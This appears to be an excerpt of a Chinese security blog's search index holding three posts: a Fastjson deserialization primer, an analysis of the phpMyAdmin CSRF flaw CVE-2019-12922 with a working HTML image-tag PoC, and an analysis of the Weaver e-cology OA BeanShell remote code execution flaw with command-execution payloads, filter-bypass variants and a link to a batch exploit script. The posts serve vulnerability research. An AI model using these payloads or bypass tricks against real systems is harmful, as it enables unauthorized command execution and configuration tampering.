    <url>%2F2019%2F10%2F08%2F%E3%80%90%E4%B8%93%E6%A0%8F%E3%80%91Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%971-%E4%BB%80%E4%B9%88%E6%98%AFfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[#概述最近Fastjson反序列化Bypass绕过AutoType的漏洞越来越多，趁着国庆休息时间，把历年来曝光的3个FastjsonRCE漏洞进行了分析，把过程笔记整理下，本来想一篇blog文但篇幅越写越多，考虑到阅读体验就做了一个Fastjson反序列化漏洞的系列文章,大致如下：[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？[2]. Fastjson反序列化漏洞系列2-如何构造fastjson反序列化RCE漏洞Poc？[3]. Fastjson反序列化漏洞系列3-fastjson&lt;=1.2.24反序列化RCE漏洞（CNVD-2017-02833）原理分析及Poc构造[4]. Fastjson反序列化漏洞系列4-fastjson&lt;1.2.48反序列化RCE漏洞（CNVD-2019-22238）原理分析及Poc构造[5]. Fastjson反序列化漏洞系列5-fastjson&lt;=1.2.60反序列化RCE漏洞（CNVD-2019-32498）原理分析及Poc构造（大概4-5篇这样，后面陆续更新，感兴趣的小伙伴可以搜索微信公众号：SecurityCN，或扫码文末的二维码关注） [1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？#什么是Fastjson？Fastjson是Alibaba开发的Java语言编写的高性能JSON库（https://github.com/alibaba/fastjson）采用“假定有序快速匹配”的算法，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端等，目前有2个主要接口toJsonString和parseObject来分别实现序列化和反序列化。 #Fastjson反序列化框架Fastjson反序列化框架图 在Fastjson反序列化框架中JSON是门面类，提供一些静态方法，如parse，parseObject，其主要功能都是在DefaultJSONParser类中实现的。DefaultJSONParser引用了ParserConfig类，该类主要保存一些相关配置信息。也引用了JSONLexerBase类用来处理字符分析，序列化用到的是JavaBeanSerializer类，而反序列化用到的是JavaBeanDeserializer类。 #Demo演示FastJson反序列化实现过程1.定义User.java,代码如下： 12345678910//定义用户类public class User &#123; private Long id; private String name;//增加get/set方法 public Long getId() &#123; return id; &#125; public void setId(Long id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 2.定义测试Test.java,代码如下： 12345678910111213141516171819import com.alibaba.fastjson.JSON;//定义测试类，public class Test &#123; public static void main(String[] args) &#123; User guestUser = new User(); guestUser.setId(1L); guestUser.setName(&quot;guest&quot;); //将java对象序列化为json对象 String jsonString1 = JSON.toJSONString(guestUser); System.out.println(&quot;Json对象:&quot;+jsonString1); //将json反序列化为java对象 String jsonString2= &quot;&#123;\&quot;id\&quot;:2,\&quot;name\&quot;:\&quot;root\&quot;&#125;&quot;; User user = JSON.parseObject(jsonString2,User.class); System.out.println(&quot;Java对象:&quot;+user); //打印变量类型 System.out.println(user.getClass().getTypeParameters()); &#125;&#125; 运行最后输出如下jsonString1–Json对象:{“id”:1,”name”:”guest”}user–Java对象:User@7ab2bfe1user的类型为[Ljava.lang.reflect.TypeVariable;@497470ed #动态调试理解调用链还是利用上面的Demo进行动态调试在String jsonString1 = JSON.toJSONString(guestUser); 和User user =JSON.parseObject(jsonString2,User.class); 处设置断点 1.动态调试理解这个序列化过程先调用/com/alibaba/fastjson/JSON.class的toJSONString对象 com/alibaba/fastjson/serializer/SerializeWriter.class的SerializeWriter对象 读取SerializeConfig 配置 最后调用 com/alibaba/fastjson/serializer/JavaBeanSerializer.class类进行序列化 com/alibaba/fastjson/JSON.class 的toJSONString 2.动态调试理解反序列化过程 先调用com/alibaba/fastjson/JSON.class的parseObject 对象 跳到com/alibaba/fastjson/parser/DefaultJSONParser.class 的parseObject对象 com/alibaba/fastjson/parser/ParserConfig.class的ObjectDeserializer 对象 最后调用com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class类进行反序列化 #造成远程命令执行的原因？Fastjson反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。常见的攻击流程是这样的：攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。 本节到此结束，下一节是 [2].Fastjson反序列化漏洞系列1-如何构造fastjson反序列化RCE漏洞Poc？敬请期待，感兴趣的小伙伴可以搜索微信公众号：SecurityCN，或扫码文末的二维码关注。 免责声明： 本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。 参考：[1].http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/]]></content>
      <categories>
        <category>技术</category>
        <category>专栏</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>Web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞分析-CVE-2019-12922_phpMyAdmin小于等于4.9.0.1CSRF漏洞分析]]></title>
    <url>%2F2019%2F09%2F27%2F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-12922-phpMyAdmin%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E4-9-0-1CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1%2F</url>
    <content type="text"><![CDATA[最近安全圈曝光了很多漏洞，之前审计了泛微 OARCE 漏洞,今天审计分析phpMyAdmin_CSRF漏洞 #事件背景 2019年9月16日，网络上曝光phpMyAdmin4.9.0.1版本中存在跨站请求伪造漏洞，攻击者可利用该漏洞通过受影响客户端向服务器发送非预期的请求。这个漏洞影响phpMyAdmin的版本最高到4.9.0.1，这是phpMyAdmin目前最新的发行版本。因为这个漏洞危及的范围比较小，仅允许攻击者删除目标服务器里的，phpMyAdmin控制面板中关于setup页面中的服务器配置。攻击者所需要做的仅仅是发送一个精心设计的URL给网页的管理员，这个管理员需要在他的浏览器登录到phpMyAdmin控制面板，然后在同一个浏览器点击这个URL，就会不知不觉地删除了配置里的服务器。 #漏洞信息 漏洞名称 phpMyAdmin_CSRF漏洞 CVE编号 CVE-2019-12922 CNVD编号 CNVD-2019-31657 影响版本 phpMyAdmin &lt;=4.9.0.1（据说phpMyAdmin 5.0.0-alpha1版也存在） 威胁等级 中危 公开时间 2019年9月16日 #漏洞分析 1.什么是CSRF？ CSRF(Cross-site request forgery)跨站请求伪造，也被称为One ClickAttack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。 上图为CSRF攻击的一个简单模型：用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。 2.静态审计 漏洞存在于phpmyadmin/setup/index.php文件，该文件为安装phpmyadmin的脚本，可以在此脚本中创建连接新的Mysql数据库服务器 允许get请求参数为page， 再跟进到/setup/frames/$page.inc.php 也就是 /setup/frames/server.inc.php文件 这个php从Get请求获取了 mode和id这两个参数的值， mode有三种（’edit’、’remove’、’revert’） 当mode=remove且Servers/$id不为null时，使用removeServer方法删除server然后Location跳转到/phpmyadmin/setup/index.php首页 我们再跟进看下phpMyAdmin/libraries/config/ConfigFile.class.php的removeServer方法 unset这句是关键 unset函数是销毁指定变量，在这里就是删掉$server ```unset($_SESSION[$this-&gt;id][‘Servers’][$last_server]);``` 导致CSRF的根据原因为phpmyamdin，没有全局token，只有在登录/phpmyadmin/index.php后，才会创建token 所以在设置服务器页面phpmyadmin/setup/index.php是没有token的，故此无法防御跨站请求伪造攻击，这样$server就通过CSRF漏洞被删除了。 但是这个漏洞不能执行Sql语句拖库，故此危害等级不高，但是利用起来很简单，攻击者只需要知道服务器的URL，就能利用CSRF漏洞删除phpmyamdi配置中的服务器。 #漏洞复现 在浏览器打开 http://192.168.21.56/phpmyadmin/setup/index.php 为了方便后面CSRF漏洞能够成功删除服务器成功先New一个服务器 点击New server就跳转到服务器创建页面 save之后跳转到之前setup/index.php页面 可以看到这里Delete按钮就是 Poc中的地址，点击这个delete就能删除这个server 开始复现CSRF漏洞，构造Poc，新建一个CSRF.html文件写入以下代码 123&lt;p&gt;Deleting Server 1&lt;/p&gt;&lt;img src=&quot;http://192.168.31.56/phpmyadmin/setup/index.php?page=servers&amp;mode=remove&amp;id=1&quot;;style=&quot;display:none;&quot;/&gt; 在同一个浏览器中执行 通过抓包设置断点可以看到该请求 该请求删除了id为1的server 再返回/setup/index.php 查看发现之前新建的 id为1 ，name为11111的server被删除 本次分析复现的代码及POC会在本人的Github上分享https://github.com/securitycn/ #修复建议 厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.phpmyadmin.net/ #免责声明 本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。 #版权 本文为作者原创禁止一切非授权转载和抄袭行为，如需转载请联系在公众号后台留言（留言请说明来意），转载请注明出处及下方二维码。 #求关注 欢迎大家留言，喜欢文章的朋友可以关注本公众号 微信公众号：securitycn 博客：https://securitycn.github.io Github: https://github.com/securitycn]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>Web安全</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[泛微OA E-cology 远程代码执行漏洞分析、过滤器绕过及批量检测工具]]></title>
    <url>%2F2019%2F09%2F24%2F%E6%B3%9B%E5%BE%AEOA-E-cology-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%81%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E5%8F%8A%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[【漏洞分析】泛微OA E-cology 远程代码执行漏洞原理分析、过滤器绕过及批量检测工具 Author:Ja0k 最近曝光了很多漏洞，后续将对这些有代表性的漏洞进行分析审分析，今天有空先审计分析 泛微OA RCE 漏洞 #事件背景 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的JAVABeanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。 #漏洞信息 漏洞名称 泛微OA E-cology 远程代码执行漏洞 CVE编号 - CNVD编号 CNVD-2019-32204 影响版本 e-cology &lt;=9.0 威胁等级 高危 公开时间 2019年9月17日 #漏洞分析 此次存在漏洞的是JAVA Beanshell接口，现在了解下Beanshell的基础。 1. BeanShell 知识（来源：https://github.com/beanshell/beanshell） BeanShell是一个小型的，免费的，可嵌入的Java源解释器，具有使用Java编写的对象脚本语言功能。BeanShell动态执行标准Java语法，并通过通用的脚本编写便利进行扩展，例如松散的类型，命令和方法闭包（如Perl和JavaScript）。 可以交互地使用BeanShell进行Java实验和调试，以及以新方式扩展应用程序。 Beanshell可以执行print、dir、eval、exec等命令 页面如下图 2. 泛微中Beanshell库jar代码静态分析 从泛微里提取存在漏洞的lib文件 bsh-2.0b4.jar 反编译查看servlet.BshServlet这个类 在类中发现doGet和doPost方法，用来接收并执行提交的数据。 doPost实际上就是对doGet的二次封装 在doGet方法中看到调用evalScript方法创建一个名为obj的对象，再看evalScript这个方法中的pramString参数，最终会被interpreter.eval处理。如下图 跟进 bsh.Interpreter类的eval方法 跳转到bsh.classpath/ClassManagerImpl.class类 该类调用了bsh.commands/exec.bsh脚本，该脚本可以执行命令 #漏洞复现 泛微OA BeanShell复现测试 把print(“hello!”)换成exec(“whoami”)，就可以测试能否执行系统命令了。 Poc1: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw 如果有全局过滤器过滤了exec或eval，会有报错，如下图： 可以采用unicode编码、字符串拼接等方式绕过,见下图： Poc2: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw Poc3： bsh.script=eval%00(“ex”%2b”ec(bsh.httpServletRequest.getParameter(\“command\“))”);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami 2. 批量验证脚本 该脚本拼接了常用的泛微OA web路径，结合了本文讲解绕过过滤器的3个Poc 该工具仅用于测试研究使用请勿他用。 3.本文用到的文件下载地址 泛微OA中提取的Beanshell库： https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/bsh-2.0b4.jar 批量脚本： https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/Weaver-Ecology-OA_RCE-EXP.py #免责声明 本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>代码审计</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
</search>
